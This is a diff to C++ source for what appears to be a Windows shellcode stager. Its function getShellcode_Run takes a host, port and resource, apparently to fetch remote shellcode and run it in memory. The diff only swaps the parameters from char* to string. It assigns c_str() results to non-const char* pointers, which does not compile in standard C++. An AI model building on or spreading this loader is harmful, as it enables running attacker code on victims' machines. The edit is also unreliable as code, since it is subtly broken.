@@ -7,7 +7,8 @@
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <stdio.h>
-
+#include <iostream>
+using namespace std;
 #pragma comment (lib, "ntdll")
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
@@ -15,8 +16,12 @@
 #define DEFAULT_BUFLEN 4096
 
 
-void getShellcode_Run(char* host, char* port, char* resource) {
+void getShellcode_Run(string h, string p, string r) {
 
+    char* host=h.c_str();
+    char* port=p.c_str();
+    char* resource=r.c_str();
+	
     DWORD oldp = 0;
     BOOL returnValue;
 
